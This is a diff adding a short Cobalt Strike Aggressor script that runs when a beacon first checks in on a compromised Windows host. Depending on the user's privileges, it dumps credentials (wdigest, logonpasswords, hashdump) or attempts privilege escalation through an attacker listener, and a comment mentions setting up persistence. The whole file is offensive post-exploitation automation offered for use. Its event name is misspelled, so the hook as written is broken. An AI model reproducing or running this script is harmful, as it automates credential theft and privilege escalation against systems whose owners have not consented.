@@ -1,0 +1,33 @@
+#################################################
+# Created by @jgaudard  :: I don't twitter much 
+# Aggressor script for initial_beacon with cobaltstrike
+# Created: 29 Sept 2016
+# Version 1.0
+#################################################
+
+on becaon_initial {
+  if("SYSTEM" isin beacon_info($1, "user")) {
+    say("user is system");
+    bwdigest($1);
+    blogonpasswords($1);
+    bhashdump($1);
+    say("I should setup some persistence...");
+  }
+  else if(" *" isin beacon_info($1, "user")) {
+    say("user has admin rights");
+    belevate($1, "http_443");   ## http_443 is what I call my listener
+    bsleep($1, 300, 30);
+  }
+  else {
+    say("just a regular user, hopefully elevation works");
+    belevate($1, "http_443");
+    bsleep($1, 300, 30);
+  }
+}
+
+
+
+
+
+
+
